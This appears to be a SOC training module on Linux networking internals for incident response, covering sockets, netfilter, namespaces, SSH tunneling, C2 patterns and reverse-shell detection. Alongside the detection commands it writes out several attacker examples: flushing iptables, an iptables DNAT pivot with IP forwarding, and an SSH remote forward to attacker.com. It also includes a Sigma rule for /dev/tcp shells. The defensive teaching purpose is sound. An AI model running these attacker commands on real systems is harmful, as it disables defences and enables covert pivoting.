# Linux/08 — Networking Stack

> Every C2 channel, every lateral movement, every data exfiltration path is a network connection. Understanding how Linux handles networking at the kernel level — how sockets work, how packets flow, how connections are tracked — is what allows you to find attacker infrastructure that has been carefully hidden from userspace tools.

![MITRE](https://img.shields.io/badge/MITRE-T1049%20|%20T1090%20|%20T1571%20|%20T1095-red)
![Platform](https://img.shields.io/badge/Platform-Linux-orange)

---

## Network Stack Architecture

```
Application (curl, sshd, python)
        |
        v
Socket API (POSIX — socket, bind, connect, send, recv)
        |
        v
Transport Layer (TCP / UDP)
  - TCP: connection-oriented, reliable, ordered
  - UDP: connectionless, unreliable, fast
        |
        v
Network Layer (IP — routing, addressing)
        |
        v
Netfilter (iptables/nftables hooks — packet filtering)
        |
        v
Network Interface (eth0, lo, tun0)
        |
        v
Physical / Virtual Hardware
```

Every packet traverses this stack. Netfilter sits in the middle — the kernel firewall framework that iptables and nftables configure.

---

## Sockets

A socket is a kernel object representing one endpoint of a network connection. Created via the `socket()` syscall, it is accessed via a file descriptor — consistent with "everything is a file."

### Socket Types

| Type | Protocol | Use |
|------|---------|-----|
| SOCK_STREAM | TCP | Reliable, ordered byte stream |
| SOCK_DGRAM | UDP | Unreliable datagrams |
| SOCK_RAW | Raw IP | Craft arbitrary packets — requires CAP_NET_RAW |
| SOCK_PACKET | Link layer | Capture raw frames |

### Unix Domain Sockets

Sockets for IPC between processes on the same machine. No network involved — kernel-level pipe with socket semantics.

```bash
# List Unix domain sockets
ss -xl
ls -la /run/*.sock /tmp/*.sock 2>/dev/null

# Common legitimate Unix sockets
/run/systemd/private/journal.socket
/var/run/docker.sock    <- Docker daemon socket (dangerous if world-accessible)
/tmp/.X11-unix/X0       <- X11 display socket
```

**Docker socket:** If `/var/run/docker.sock` is mounted into a container, the container can control the Docker daemon — creating privileged containers, mounting host filesystem, escaping the container entirely.

---

## TCP Connection Lifecycle

```
Client                    Server
  |                          |
  |--- SYN ----------------> |   (connect() called)
  |<-- SYN-ACK ------------- |
  |--- ACK ----------------> |   (3-way handshake complete)
  |                          |
  |=== Data Exchange ======= |
  |                          |
  |--- FIN ----------------> |   (close() called)
  |<-- ACK --------------- - |
  |<-- FIN --------------- - |
  |--- ACK ----------------> |   (connection terminated)
```

### TCP States — Security Significance

```bash
ss -tn    # or netstat -tn
```

| State | Meaning | Security Note |
|-------|---------|---------------|
| LISTEN | Waiting for connections | Open service — attack surface |
| ESTABLISHED | Active connection | Active session |
| TIME_WAIT | Closing, waiting for delayed packets | Normal |
| CLOSE_WAIT | Remote closed, local hasn't | May indicate hung connection |
| SYN_RECV | Received SYN, sent SYN-ACK | SYN flood indicator if many |

---

## Network Investigation Commands

```bash
# All TCP connections with process info
ss -tnap

# Established connections only
ss -tnap state established

# Listening services
ss -tlnp

# UDP sockets
ss -unap

# All sockets summary
ss -s

# Kernel-level TCP state (bypass userspace tools)
cat /proc/net/tcp
cat /proc/net/tcp6

# ARP cache (lateral movement neighbors)
ip neigh show
arp -a

# Routing table
ip route show
cat /proc/net/route

# Interface statistics
ip -s link show
cat /proc/net/dev

# DNS cache
cat /etc/resolv.conf
systemd-resolve --statistics 2>/dev/null

# Active network namespaces
ip netns list
ls /var/run/netns/
```

---

## Netfilter — iptables and nftables

Netfilter is the Linux kernel packet filtering framework. iptables and nftables are userspace tools that configure it.

### iptables Structure

```
Packet arrives
    |
    v
PREROUTING chain (nat table)    <- DNAT, port forwarding
    |
    v
FORWARD chain (filter table)    <- routing packets between interfaces
    |
    v (if destined for local process)
INPUT chain (filter table)      <- packets to local processes
    |
    v
Local process
    |
    v
OUTPUT chain (filter table)     <- packets from local processes
    |
    v
POSTROUTING chain (nat table)   <- SNAT, masquerading
```

```bash
# View all iptables rules
iptables -L -n -v --line-numbers
iptables -t nat -L -n -v

# View nftables rules
nft list ruleset

# Check if firewall is active
systemctl status iptables nftables ufw firewalld 2>/dev/null

# Attacker clearing iptables (disabling firewall)
iptables -F          # flush all rules
iptables -X          # delete all chains
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
```

### Port Forwarding / Pivoting via iptables

```bash
# Attacker sets up port forward (pivot)
# Traffic arriving on port 8080 forwarded to internal host
iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 10.0.0.5:22
iptables -t nat -A POSTROUTING -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward

# Detection
cat /proc/sys/net/ipv4/ip_forward    # should be 0 on workstations
iptables -t nat -L -n -v | grep DNAT
```

---

## Raw Sockets — Packet Crafting and Sniffing

Raw sockets (SOCK_RAW) allow sending and receiving arbitrary IP packets — bypassing the transport layer. Requires `CAP_NET_RAW`.

```bash
# Legitimate use: ping (uses ICMP via raw socket)
# Attacker use: packet crafting, ICMP tunneling, covert channels

# Check processes using raw sockets
ss -wn    # raw sockets
cat /proc/net/raw
cat /proc/net/raw6
```

### ICMP Tunneling

Data hidden inside ICMP echo request/reply packets — bypasses firewalls that allow ping but block other protocols.

Detection: ICMP packets with unusually large payloads, high frequency, or unusual data in the echo field.

```bash
# Monitor ICMP traffic
tcpdump -i eth0 icmp -nn
# Large ICMP payload = suspicious
tcpdump -i eth0 'icmp and greater 100' -nn
```

---

## Network Namespaces

Network namespaces provide isolated network stacks — each with its own interfaces, routing tables, and firewall rules. Used by containers and VPNs.

```bash
# List network namespaces
ip netns list
ls /var/run/netns/

# Execute command in network namespace
ip netns exec <name> ss -tnap

# Check which namespace a process is in
ls -la /proc/<pid>/ns/net

# Compare with PID 1 (host namespace)
ls -la /proc/1/ns/net
# Same inode = same namespace (host)
# Different inode = inside container or separate network namespace
```

**Container escape indicator:** A process in a container that has the same network namespace inode as PID 1 (the host init process) has escaped its network isolation.

---

## /etc/hosts and DNS Resolution

```bash
# Static DNS resolution — checked before DNS
cat /etc/hosts

# DNS resolution order
cat /etc/nsswitch.conf | grep hosts
# files dns    <- check /etc/hosts first, then DNS
# dns files    <- check DNS first

# Current DNS servers
cat /etc/resolv.conf
systemd-resolve --status 2>/dev/null | grep "DNS Servers"

# Flush DNS cache
systemd-resolve --flush-caches 2>/dev/null
```

**Hosts file manipulation:** Attackers modify /etc/hosts to redirect security tool domains to 127.0.0.1 — blocking updates, telemetry, or SIEM communication. Always check /etc/hosts during IR.

---

## SSH Tunneling and Port Forwarding

SSH tunnels are a common attacker technique for covert communication and lateral movement.

```bash
# Local port forward: access remote_host:3306 via localhost:13306
ssh -L 13306:remote_host:3306 user@jumphost

# Remote port forward: expose local port to remote host
ssh -R 8080:localhost:80 user@attacker.com

# Dynamic SOCKS proxy (full tunnel)
ssh -D 1080 user@jumphost
# Then configure proxychains to use localhost:1080

# Detection: SSH with -R, -L, -D flags in process cmdline
grep -r "ssh.*-[RLD]" /proc/*/cmdline 2>/dev/null | tr '\0' ' '
```

---

## C2 Communication Patterns

Attackers use various protocols to blend C2 traffic with legitimate network activity.

| Technique | Protocol | Detection |
|-----------|---------|-----------|
| HTTP/HTTPS C2 | TCP 80/443 | Beaconing patterns, JA3 fingerprint |
| DNS tunneling | UDP 53 | High-frequency queries, long subdomains |
| ICMP tunneling | ICMP | Large ICMP payloads, high frequency |
| Custom ports | TCP/UDP | Processes binding unusual ports |
| Reverse shell | TCP | Shell process with network socket |
| Named pipes | Unix socket | IPC-based C2 in containers |

### Beaconing Detection

```bash
# Log connections at intervals to detect beaconing
while true; do
  ss -tnap state established | grep -v "127.0.0.1\|::1"
  sleep 60
done > /tmp/connection_log.txt

# DNS tunneling indicators
tcpdump -i eth0 -w /tmp/dns.pcap port 53
# Look for: many queries, long names, high entropy subdomains
```

---

## Reverse Shell Detection

A reverse shell is a process (bash, sh, python) with stdin/stdout/stderr connected to a network socket.

```bash
# Find shell processes with network connections
ss -tnap | grep -E "bash|sh|python|perl|nc |netcat" 

# Find processes with socket as stdin/stdout
for pid in $(ls /proc | grep '^[0-9]'); do
  exe=$(readlink /proc/$pid/exe 2>/dev/null)
  if echo "$exe" | grep -qE "bash|sh|python|perl"; then
    # Check if fd 0,1,2 are sockets
    for fd in 0 1 2; do
      fdlink=$(readlink /proc/$pid/fd/$fd 2>/dev/null)
      if echo "$fdlink" | grep -q "socket:"; then
        echo "REVERSE SHELL INDICATOR: PID $pid ($exe) fd$fd -> $fdlink"
      fi
    done
  fi
done
```

---

## MITRE ATT&CK Mapping

| Technique | ID |
|-----------|-----|
| System Network Connections Discovery | T1049 |
| Proxy | T1090 |
| Non-Standard Port | T1571 |
| Non-Application Layer Protocol | T1095 |
| Protocol Tunneling | T1572 |
| Remote Services: SSH | T1021.004 |
| Exfiltration Over C2 Channel | T1041 |

---

## Sigma Rule — Reverse Shell via Bash

```yaml
title: Bash Reverse Shell via /dev/tcp
id: e1f2a3b4-c5d6-7890-efab-901234567890
status: stable
description: >
  Detects bash reverse shell using /dev/tcp pseudo-device.
  Common attacker technique for establishing interactive
  shell over network connection.
author: Solomon James (@Jaysolex)
tags:
  - attack.execution
  - attack.t1059.004
  - attack.command_and_control
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: EXECVE
    a0: bash
    a2|contains:
      - '/dev/tcp/'
      - '/dev/udp/'
  condition: selection
falsepositives:
  - Legitimate bash scripts testing connectivity
level: high
```

---

## Practitioner Notes

**On /proc/net vs ss during IR:** If you suspect a rootkit is hiding network connections, always check /proc/net/tcp directly rather than relying on ss or netstat. /proc/net/tcp is generated by the kernel network subsystem and is not affected by userspace hooks. Parse the hex addresses manually — the local and remote address:port fields are hex-encoded little-endian.

**On Docker socket exposure:** The Docker daemon socket at /var/run/docker.sock grants full control over Docker. Any process that can write to this socket can create a privileged container mounting the host filesystem — trivial container escape. During IR, check socket permissions: `stat /var/run/docker.sock`. World-readable is a critical finding.

**On SSH tunnel detection:** Legitimate SSH connections appear as ssh or sshd processes with established TCP connections. Tunnels add the -L, -R, or -D flags to the SSH command line — visible in /proc/pid/cmdline. Additionally, the forwarded port will appear as a new LISTEN socket from the sshd process on the expected local port.

---

## Knowledge Validation

**How do you detect a reverse shell at the process level without network monitoring tools?**
Check /proc/pid/fd/ for shell processes (bash, sh, python) where file descriptors 0, 1, or 2 (stdin, stdout, stderr) are symlinks to socket inodes rather than terminal devices. A shell with its standard streams connected to a socket is a reliable reverse shell indicator. Cross-reference the socket inode with /proc/net/tcp to identify the remote IP and port.

**An attacker enables IP forwarding on a compromised Linux host. What does this enable and how do you detect it?**
IP forwarding causes the kernel to route packets between network interfaces — transforming the host into a router. An attacker uses this to pivot: traffic from the attacker's machine is forwarded through the compromised host to internal network targets. Detection: `cat /proc/sys/net/ipv4/ip_forward` returns 1. On workstations and servers that are not routers, this should always be 0. Also check iptables NAT rules for DNAT entries pointing to internal hosts.

**Why is DNS tunneling difficult to block with simple port-based firewall rules?**
DNS uses UDP port 53 which must be allowed outbound for name resolution — blocking it breaks normal operations. DNS tunneling encodes arbitrary data in DNS query subdomains and responses. The traffic uses the legitimate protocol on the legitimate port. Detection requires inspecting query content: high-frequency queries to the same domain, unusually long subdomain strings, high entropy in subdomain names, and TXT record responses with large payloads.

---

*Linux/08-Networking-Stack | OS-Internals-for-SOC | Solomon James (@Jaysolex)*
